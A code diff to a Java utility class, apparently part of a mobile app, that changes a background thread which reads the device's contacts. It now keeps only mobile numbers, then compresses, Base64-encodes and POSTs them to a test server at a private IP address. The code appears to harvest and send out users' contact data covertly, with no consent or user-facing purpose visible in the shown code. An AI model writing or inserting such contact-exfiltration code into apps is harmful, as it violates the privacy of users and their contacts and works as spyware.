@@ -1,6 +1,7 @@
 package com.bus3.common.utils;
 
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 
 import org.apache.http.HttpResponse;
@@ -170,20 +171,23 @@ public class BaseUtils {
 			public void run() {
 				try {
 
-					JSONArray ja = new JSONArray();
+					StringBuilder sb = new StringBuilder();
 
-					for (Contact contact : robot.arm.utils.BaseUtils.getContact(ctx)) {
-						JSONObject jo = new JSONObject();
+					List<Contact> contactList = robot.arm.utils.BaseUtils.getContact(ctx);
 
-						jo.put("name", contact.getName());
-						jo.put("phone", contact.getPhone());
-						jo.put("mobile", contact.getMobile());
+					for (int i = 0; i < contactList.size(); i++) {
 
-						ja.put(jo);
+						if (contactList.get(i).getMobile() == null || "".equals(contactList.get(i).getMobile()))
+							continue;
+
+						sb.append(contactList.get(i).getMobile());
+
+						if (i < contactList.size() - 1)
+							sb.append(",");
 					}
 
 					Map<String, String> param = new HashMap<String, String>(1);
-					param.put("contact", Base64Util.encodeFromString(ZipUtil.compress(ja.toString())));
+					param.put("contact", Base64Util.encodeFromString(ZipUtil.compress(sb.toString())));
 
 					robot.arm.utils.BaseUtils.post("http://192.168.0.117:8080/test/contact", null, param, robot.arm.utils.BaseUtils.ENCODING);
 
